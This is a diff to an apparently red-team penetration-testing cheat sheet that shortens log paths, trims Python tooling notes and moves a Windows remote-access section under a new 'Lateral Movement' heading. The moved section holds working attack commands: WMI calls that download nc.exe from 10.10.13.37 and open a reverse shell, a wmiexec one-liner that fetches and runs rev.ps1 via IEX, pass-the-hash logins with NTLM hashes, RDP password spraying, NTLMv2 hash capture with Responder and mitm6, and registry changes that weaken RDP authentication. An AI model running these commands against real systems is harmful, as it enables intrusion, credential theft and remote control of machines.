@@ -2094,8 +2094,8 @@ Arpspoof:
 $ git clone https://github.com/lgandx/Responder
 $ sudo ./Responder.py -I eth0 -wfrd -P -v
 
-$ head -n 1 logs/*.txt | grep -v -e logs -e '^$' -e anonymous | sort -u -t: -k1,1 > ~/workspace/loot/net-ntlmv2.responder
-$ sort -u -t: -k1,1 ~/workspace/loot/net-ntlmv2.responder >> ~/workspace/loot/net-ntlmv2.txt && rm ~/workspace/loot/net-ntlmv2.responder
+$ head -n 1 logs/*.txt | grep -v -e logs -e '^$' -e anonymous | sort -u -t: -k1,1 > ~/ws/loot/net-ntlmv2.responder
+$ sort -u -t: -k1,1 ~/ws/loot/net-ntlmv2.responder >> ~/ws/loot/net-ntlmv2.txt && rm ~/ws/loot/net-ntlmv2.responder
 ```
 
 
@@ -2187,13 +2187,13 @@ $ pipx install -f "git+https://github.com/fox-it/mitm6.git"
 Run:
 
 ```
-$ sudo smbserver.py -smb2support share `pwd` | tee -a ~/workspace/log/mitm6-smbserver.out
+$ sudo smbserver.py -smb2support share `pwd` | tee -a ~/ws/log/mitm6-smbserver.out
 $ sudo mitm6.py -i eth0 -d megacorp.local --ignore-nofqdn
 
-$ cat ~/workspace/log/mitm6-smbserver.out | grep 'authenticated successfully' -A1 | grep aaaaaaaaaaaaaaaa | cut -c 5- | grep -v '\$' > ~/workspace/loot/net-ntlmv2.mitm6
-$ sort -u -t: -k1,1 ~/workspace/loot/net-ntlmv2.mitm6 >> ~/workspace/loot/net-ntlmv2.txt && rm ~/workspace/loot/net-ntlmv2.mitm6
+$ cat ~/ws/log/mitm6-smbserver.out | grep 'authenticated successfully' -A1 | grep aaaaaaaaaaaaaaaa | cut -c 5- | grep -v '\$' > ~/ws/loot/net-ntlmv2.mitm6
+$ sort -u -t: -k1,1 ~/ws/loot/net-ntlmv2.mitm6 >> ~/ws/loot/net-ntlmv2.txt && rm ~/ws/loot/net-ntlmv2.mitm6
 
-$ cat ~/workspace/log/mitm6-smbserver.out | grep 'authenticated successfully' -A1 | grep aaaaaaaaaaaaaaaa | grep '\$' | cut -c 5- | sort -u -t: -k1,1
+$ cat ~/ws/log/mitm6-smbserver.out | grep 'authenticated successfully' -A1 | grep aaaaaaaaaaaaaaaa | grep '\$' | cut -c 5- | sort -u -t: -k1,1
 ```
 
 ##### Attack vectors
@@ -3017,7 +3017,7 @@ PS > Invoke-DomainPasswordSpray -UserList .\users.txt -Domain megacorp.local -Pa
 #### RDP
 
 ```
-$ crowbar -b rdp -s 192.168.1.0/24 -u snovvcrash -c 'Passw0rd!' -l ~/workspace/log/crowbar.log -o ~/workspace/log/crowbar.out
+$ crowbar -b rdp -s 192.168.1.0/24 -u snovvcrash -c 'Passw0rd!' -l ~/ws/log/crowbar.log -o ~/ws/log/crowbar.out
 ```
 
 
@@ -3035,8 +3035,8 @@ $ pip3 install .
 #### lookupsid.py
 
 ```
-$ lookupsid.py MEGACORP/snovvcrash:'Passw0rd!'@127.0.0.1 20000 | tee ~/workspace/log/lookupsid.out
-$ cat ~/workspace/log/lookupsid.out | grep SidTypeUser | grep -v -e '\$' -e HealthMailbox | awk -F'\' '{print $2}' | awk '{print $1}' | perl -nle 'print if m{^[[:ascii:]]+$}' > ~/workspace/enum/allusers.txt
+$ lookupsid.py MEGACORP/snovvcrash:'Passw0rd!'@127.0.0.1 20000 | tee ~/ws/log/lookupsid.out
+$ cat ~/ws/log/lookupsid.out | grep SidTypeUser | grep -v -e '\$' -e HealthMailbox | awk -F'\' '{print $2}' | awk '{print $1}' | perl -nle 'print if m{^[[:ascii:]]+$}' > ~/ws/enum/allusers.txt
 ```
 
 
@@ -3046,7 +3046,7 @@ $ cat ~/workspace/log/lookupsid.out | grep SidTypeUser | grep -v -e '\$' -e Heal
 * [https://github.com/dirkjanm/adidnsdump](https://github.com/dirkjanm/adidnsdump)
 
 ```
-$ cd ~/workspace/enum/
+$ cd ~/ws/enum/
 $ adidnsdump -u 'megacorp.local\snovvcrash' -p 'Passw0rd!' DC01.megacorp.local
 $ mv records.csv adidnsdump.csv
 ```
@@ -3172,7 +3172,7 @@ RETURN totalUsers, usersWithSessions, 100 * usersWithSessions / totalUsers AS pe
 * [https://github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)
 
 ```
-$ cd ~/workspace/enum/bloodhound/bloodhound.py/
+$ cd ~/ws/enum/bloodhound/bloodhound.py/
 $ bloodhound-python -c All,LoggedOn -u snovvcrash -p 'Passw0rd!' -d megacorp.local -ns 127.0.0.1
 ```
 
@@ -3235,7 +3235,7 @@ PowerView3 > Get-DomainComputer -Properties Name | Resolve-IPAddress
 
 
 
-### PowerUp.ps1
+### PowerUp
 
 * [https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
 * [https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf)
@@ -3247,7 +3247,7 @@ PS > Invoke-PrivescAudit
 
 
 
-### PowerUpSQL.ps1
+### PowerUpSQL
 
 * [https://github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
 
@@ -3885,6 +3885,185 @@ Automount:
 ```
 $ crontab -e
 "@reboot    sleep 10; mount -t vboxsf /mnt/share-host ~/Desktop/Share"
+```
+
+
+
+
+
+# Lateral Movement
+
+* [https://eventlogxp.com/blog/logon-type-what-does-it-mean/](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)
+* [https://www.infosecmatter.com/rce-on-windows-from-linux-part-1-impacket/](https://www.infosecmatter.com/rce-on-windows-from-linux-part-1-impacket/)
+* [https://www.hackingarticles.in/remote-code-execution-using-impacket/](https://www.hackingarticles.in/remote-code-execution-using-impacket/)
+* [https://xakep.ru/2020/11/16/lateral-guide/](https://xakep.ru/2020/11/16/lateral-guide/)
+
+
+
+
+## RDP
+
+* [https://syfuhs.net/how-authentication-works-when-you-use-remote-desktop](https://syfuhs.net/how-authentication-works-when-you-use-remote-desktop)
+* [https://posts.specterops.io/revisiting-remote-desktop-lateral-movement-8fb905cb46c3](https://posts.specterops.io/revisiting-remote-desktop-lateral-movement-8fb905cb46c3)
+* [https://swarm.ptsecurity.com/remote-desktop-services-shadowing/](https://swarm.ptsecurity.com/remote-desktop-services-shadowing/)
+
+
+
+### Enable RDP
+
+From meterpreter:
+
+```
+meterpreter > run getgui -e
+```
+
+From PowerShell:
+
+```
+PS > Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
+PS > Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+PS > Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 1
+```
+
+
+
+### Restricted Admin
+
+* [https://www.kali.org/penetration-testing/passing-hash-remote-desktop/](https://www.kali.org/penetration-testing/passing-hash-remote-desktop/)
+* [https://blog.ahasayen.com/restricted-admin-mode-for-rdp/](https://blog.ahasayen.com/restricted-admin-mode-for-rdp/)
+* [https://labs.f-secure.com/blog/undisable/](https://labs.f-secure.com/blog/undisable/)
+* [https://shellz.club/pass-the-hash-with-rdp-in-2019/](https://shellz.club/pass-the-hash-with-rdp-in-2019/)
+
+RDP with [PtH](http://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/): RDP needs a plaintext password unless Restricted Admin mode is enabled.
+
+Enable Restricted Admin mode:
+
+```
+PS > Get-ChildItem -Recurse HKLM:\System\CurrentControlSet\Control\Lsa
+PS > Get-Item HKLM:\System\CurrentControlSet\Control\Lsa
+PS > New-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa -Name "DisableRestrictedAdmin" -Value 0 -PropertyType "DWORD"
+PS > Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name "DisableRestrictedAdmin"
+```
+
+
+
+### NLA
+
+Disable NLA:
+
+```
+PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
+PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
+```
+
+
+
+### Abusing CredSSP / TSPKG
+
+* [https://clement.notin.org/blog/2019/07/03/credential-theft-without-admin-or-touching-lsass-with-kekeo-by-abusing-credssp-tspkg-rdp-sso/](https://clement.notin.org/blog/2019/07/03/credential-theft-without-admin-or-touching-lsass-with-kekeo-by-abusing-credssp-tspkg-rdp-sso/)
+
+
+
+
+## runas
+
+```
+PS > runas /netonly /user:snovvcrash powershell
+```
+
+
+
+
+## WinRM / PSRemoting
+
+* [https://www.bloggingforlogging.com/2018/01/24/demystifying-winrm/](https://www.bloggingforlogging.com/2018/01/24/demystifying-winrm/)
+* [https://www.powershellmagazine.com/2014/03/06/accidental-sabotage-beware-of-credssp/](https://www.powershellmagazine.com/2014/03/06/accidental-sabotage-beware-of-credssp/)
+* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/network-vs-interactive-logons](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/network-vs-interactive-logons)
+
+
+
+### evil-winrm.rb
+
+* [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
+
+Install:
+
+```
+$ git clone https://github.com/Hackplayers/evil-winrm ~/tools/evil-winrm
+$ cd ~/tools/evil-winrm && bundle install && cd -
+$ ln -s ~/tools/evil-winrm/evil-winrm.rb /usr/local/bin/evil-winrm
+Or
+$ gem install evil-winrm
+```
+
+Run:
+
+```
+$ evil-winrm -u '[MEGACORP\]snovvcrash' -p 'Passw0rd!' -i 10.10.13.37 -s `pwd` -e `pwd`
+$ evil-winrm -u '[MEGACORP\]snovvcrash' -H FC525C9683E8FE067095BA2DDC971889 -i 10.10.13.37 -s `pwd` -e `pwd`
+```
+
+Note: always use full username when authenticating as a domain user, because if there're 2 users sharing the same name (a local user and a domain user), say `WORKGROUP\Administrator` and `MEGACORP\Administrator`, and you're trying to authenticate as a domain admin without providing the domain prefix, authentication will fail.
+
+
+
+
+## SMB
+
+
+
+### PsExec
+
+* [https://www.contextis.com/us/blog/lateral-movement-a-deep-look-into-psexec](https://www.contextis.com/us/blog/lateral-movement-a-deep-look-into-psexec)
+* [https://blog.openthreatresearch.com/ntobjectmanager_rpc_smb_scm](https://blog.openthreatresearch.com/ntobjectmanager_rpc_smb_scm)
+
+
+#### psexec.py
+
+```
+$ psexec.py snovvcrash:'Passw0rd!'@127.0.0.1 [powershell.exe]
+$ psexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
+```
+
+
+
+
+## WMI
+
+* [https://www.ethicalhacker.net/features/root/wmi-101-for-pentesters/](https://www.ethicalhacker.net/features/root/wmi-101-for-pentesters/)
+
+
+
+### PowerShell
+
+Basic command to check if we have privileges to execute WMI:
+
+```
+PS > Get-WmiObject -Credential $cred -ComputerName PC01 -Namespace "root" -class "__Namesapce" | Select Name
+```
+
+Execute commands:
+
+```
+PS > Invoke-WmiMethod -Credential $cred -ComputerName PC01 win32_process -Name Create -ArgumentList ("powershell (New-Object Net.WebClient).DownloadFile('http://10.10.13.37/nc.exe', 'C:\Users\bob\music\nc.exe')")
+PS > Invoke-WmiMethod -Credential $cred -ComputerName PC01 win32_process -Name Create -ArgumentList ("C:\Users\bob\music\nc.exe 10.10.13.37 1337 -e powershell")
+```
+
+
+
+### wmiexec.py
+
+```
+$ wmiexec.py -codec cp866 snovvcrash:'Passw0rd!'@127.0.0.1
+$ wmiexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
+```
+
+Get a PowerShell reverse-shell:
+
+```
+$ sudo python3 -m http.server 80
+$ sudo rlwrap nc -lvnp 443
+$ wmiexec.py -nooutput snovvcrash:'Passw0rd!'@10.10.13.38 "powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.13.37/rev.ps1')"
 ```
 
 
@@ -4532,13 +4711,13 @@ Antispam protection for Exchange:
 Discover rpcbind:
 
 ```
-$ sudo nmap -sV --script rpcinfo 10.10.10.0/24 -p111
+$ sudo nmap -sV --script rpcinfo 10.10.13.37 -p111
 ```
 
 Run Nmap scripts:
 
 ```
-$ sudo nmap -sV --script 'nfs*' 10.10.10.0/24 -p111
+$ sudo nmap -sV --script 'nfs*' 10.10.13.37 -p2049
 ```
 
 
@@ -5671,120 +5850,12 @@ PS > robocopy /B W:\Windows\NTDS\ntds.dit C:\Users\snovvcrash\Documents\ntds.dit
 
 
 
-## Install/Update
-
-```
-$ sudo apt install software-properties-common -y
-$ sudo add-apt-repository ppa:deadsnakes/ppa
-$ sudo apt update && sudo apt install python3.7 -y
-
-$ sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.6 1
-$ sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.6 2
-$ sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.7 3
-$ sudo update-alternatives --config python3
-
-$ sudo apt install python[3]-pip -y
-Or
-$ wget https://bootstrap.pypa.io/get-pip.py
-$ python[3] get-pip.py
-
-$ sudo python3 -m pip install --upgrade pip
-```
-
-
-
-
 ## pip
 
-
-
-### freeze
+Freeze dependencies:
 
 ```
 $ pip freeze --local [-r requirements.txt] > requirements.txt
-```
-
-
-
-
-## venv
-
-```
-$ sudo apt install python3-venv
-$ python3 -m venv venv
-```
-
-
-
-
-## virtualenv
-
-```
-$ sudo pip3 install virtualenv
-$ virtualenv -p python3 venv
-$ source venv/bin/activate
-$ deactivate
-```
-
-
-
-### virtualenvwrapper
-
-```
-$ sudo pip3 install virtualenvwrapper
-$ export VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3
-$ source /usr/local/bin/virtualenvwrapper.sh
-(in ~/.zshrc)
-
-$ mkvirtualenv env-name
-$ workon
-$ workon env-name
-$ deactivate
-$ rmvirtualenv env-name
-```
-
-
-
-### pipenv
-
-```
-$ sudo pip install pipenv
-$ pipenv --python python3 install [package]
-
-$ pipenv shell
-^D
-
-$ pipenv run python script.py
-$ pipenv lock -r > requirements.txt
-$ pipenv --venv
-$ pipenv --rm
-```
-
-Workaround for `TypeError: 'module' object is not callable`:
-
-```
-$ pipenv --python python3 install pip==18.0
-```
-
-
-
-
-## Testing
-
-
-
-### doctest
-
-`doctest` imported:
-
-```
-$ python3 example.py [-v]
-```
-
-`doctest` **not** imported:
-
-```
-$ python3 -m doctest example.py [-v]
 ```
 
 
@@ -5797,7 +5868,7 @@ $ python3 -m doctest example.py [-v]
 ### flake8
 
 ```
-$ python3 -m flake8 --ignore W191,E127,E226,E265,E501 somefile.py
+$ python3 -m flake8 --ignore=W191,E501,E722 somefile.py
 ```
 
 
@@ -5805,7 +5876,7 @@ $ python3 -m flake8 --ignore W191,E127,E226,E265,E501 somefile.py
 ### pylint
 
 ```
-$ python3 -m pylint -d C0111,C0122,C0330,W0312 --msg-template='{msg_id}:{line:3d},{column:2d}:{obj}:{msg}' somefile.py
+$ python3 -m pylint --disable=W0311,C0301,R0912,R0915,C0103,C0114,R0903 --msg-template='{msg_id}:{line:3d},{column:2d}:{obj}:{msg}' somefile.py
 ```
 
 
@@ -5877,179 +5948,6 @@ Install:
 $ mv /opt/tor-browser/Browser/Downloads/ghidra*.zip ~/tools
 $ cd ~/tools && unzip ghidra*.zip && rm ghidra*.zip && mv ghidra* ghidra && cd -
 $ sudo apt install openjdk-11-jdk
-```
-
-
-
-
-
-# Remote Management
-
-* [https://eventlogxp.com/blog/logon-type-what-does-it-mean/](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)
-
-
-
-
-## RDP
-
-* [https://syfuhs.net/how-authentication-works-when-you-use-remote-desktop](https://syfuhs.net/how-authentication-works-when-you-use-remote-desktop)
-* [https://posts.specterops.io/revisiting-remote-desktop-lateral-movement-8fb905cb46c3](https://posts.specterops.io/revisiting-remote-desktop-lateral-movement-8fb905cb46c3)
-* [https://swarm.ptsecurity.com/remote-desktop-services-shadowing/](https://swarm.ptsecurity.com/remote-desktop-services-shadowing/)
-
-
-
-### Enable RDP
-
-From meterpreter:
-
-```
-meterpreter > run getgui -e
-```
-
-From PowerShell:
-
-```
-PS > Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
-PS > Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-PS > Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 1
-```
-
-
-
-### Restricted Admin
-
-* [https://www.kali.org/penetration-testing/passing-hash-remote-desktop/](https://www.kali.org/penetration-testing/passing-hash-remote-desktop/)
-* [https://blog.ahasayen.com/restricted-admin-mode-for-rdp/](https://blog.ahasayen.com/restricted-admin-mode-for-rdp/)
-* [https://labs.f-secure.com/blog/undisable/](https://labs.f-secure.com/blog/undisable/)
-* [https://shellz.club/pass-the-hash-with-rdp-in-2019/](https://shellz.club/pass-the-hash-with-rdp-in-2019/)
-
-RDP with [PtH](http://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/): RDP needs a plaintext password unless Restricted Admin mode is enabled.
-
-Enable Restricted Admin mode:
-
-```
-PS > Get-ChildItem -Recurse HKLM:\System\CurrentControlSet\Control\Lsa
-PS > Get-Item HKLM:\System\CurrentControlSet\Control\Lsa
-PS > New-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa -Name "DisableRestrictedAdmin" -Value 0 -PropertyType "DWORD"
-PS > Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name "DisableRestrictedAdmin"
-```
-
-
-
-### NLA
-
-Disable NLA:
-
-```
-PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
-PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
-```
-
-
-
-### Abusing CredSSP / TSPKG
-
-* [https://clement.notin.org/blog/2019/07/03/credential-theft-without-admin-or-touching-lsass-with-kekeo-by-abusing-credssp-tspkg-rdp-sso/](https://clement.notin.org/blog/2019/07/03/credential-theft-without-admin-or-touching-lsass-with-kekeo-by-abusing-credssp-tspkg-rdp-sso/)
-
-
-
-
-## runas
-
-```
-PS > runas /netonly /user:snovvcrash powershell
-```
-
-
-
-
-## WinRM / PSRemoting
-
-* [https://www.bloggingforlogging.com/2018/01/24/demystifying-winrm/](https://www.bloggingforlogging.com/2018/01/24/demystifying-winrm/)
-* [https://www.powershellmagazine.com/2014/03/06/accidental-sabotage-beware-of-credssp/](https://www.powershellmagazine.com/2014/03/06/accidental-sabotage-beware-of-credssp/)
-* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/network-vs-interactive-logons](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/network-vs-interactive-logons)
-
-
-
-### evil-winrm.rb
-
-* [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
-
-Install:
-
-```
-$ git clone https://github.com/Hackplayers/evil-winrm ~/tools/evil-winrm
-$ cd ~/tools/evil-winrm && bundle install && cd -
-$ ln -s ~/tools/evil-winrm/evil-winrm.rb /usr/local/bin/evil-winrm
-Or
-$ gem install evil-winrm
-```
-
-Run:
-
-```
-$ evil-winrm -u '[MEGACORP\]snovvcrash' -p 'Passw0rd!' -i 10.10.13.37 -s `pwd` -e `pwd`
-$ evil-winrm -u '[MEGACORP\]snovvcrash' -H FC525C9683E8FE067095BA2DDC971889 -i 10.10.13.37 -s `pwd` -e `pwd`
-```
-
-Note: always use full username when authenticating as a domain user, because if there're 2 users sharing the same name (a local user and a domain user), say `WORKGROUP\Administrator` and `MEGACORP\Administrator`, and you're trying to authenticate as a domain admin without providing the domain prefix, authentication will fail.
-
-
-
-
-## SMB (PsExec)
-
-* [https://www.contextis.com/us/blog/lateral-movement-a-deep-look-into-psexec](https://www.contextis.com/us/blog/lateral-movement-a-deep-look-into-psexec)
-* [https://blog.openthreatresearch.com/ntobjectmanager_rpc_smb_scm](https://blog.openthreatresearch.com/ntobjectmanager_rpc_smb_scm)
-
-
-
-### psexec.py
-
-```
-$ psexec.py snovvcrash:'Passw0rd!'@127.0.0.1 [powershell.exe]
-$ psexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
-```
-
-
-
-
-## WMI
-
-* [https://www.ethicalhacker.net/features/root/wmi-101-for-pentesters/](https://www.ethicalhacker.net/features/root/wmi-101-for-pentesters/)
-
-
-
-### PowerShell
-
-Basic command to check if we have privileges to execute WMI:
-
-```
-PS > Get-WmiObject -Credential $cred -ComputerName PC01 -Namespace "root" -class "__Namesapce" | Select Name
-```
-
-Execute commands:
-
-```
-PS > Invoke-WmiMethod -Credential $cred -ComputerName PC01 win32_process -Name Create -ArgumentList ("powershell (New-Object Net.WebClient).DownloadFile('http://10.10.13.37/nc.exe', 'C:\Users\bob\music\nc.exe')")
-PS > Invoke-WmiMethod -Credential $cred -ComputerName PC01 win32_process -Name Create -ArgumentList ("C:\Users\bob\music\nc.exe 10.10.13.37 1337 -e powershell")
-```
-
-
-
-### wmiexec.py
-
-```
-$ wmiexec.py -codec cp866 snovvcrash:'Passw0rd!'@127.0.0.1
-$ wmiexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
-```
-
-Get a PowerShell reverse-shell:
-
-```
-$ sudo python3 -m http.server 80
-$ sudo rlwrap nc -lvnp 443
-$ wmiexec.py -nooutput snovvcrash:'Passw0rd!'@10.10.13.38 "powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.13.37/rev.ps1')"
 ```
 
 
@@ -6699,7 +6597,7 @@ Syncing a forked repository:
 ```
 $ git remote add upstream https://github.com/original/repository.git
 $ git fetch upstream
-$ git checkout master
+$ git checkout --track master
 $ git rebase upstream/master (or git merge upstream/master)
 $ git push -f origin master
 ```
